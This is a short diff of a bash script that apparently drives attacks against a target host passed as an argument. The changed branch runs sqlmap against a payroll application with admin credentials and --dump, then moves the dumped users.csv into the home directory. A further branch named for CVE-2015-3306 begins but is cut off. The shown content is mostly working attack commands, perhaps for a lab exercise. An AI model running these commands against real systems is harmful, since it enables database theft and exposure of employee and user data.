@@ -6,7 +6,7 @@ TARGET=$2
 
 if [ $ATTACK == "1" ]
 then 
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dump 
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
 elif [ $ATTACK == "CVE-2015-3306" ]
 then
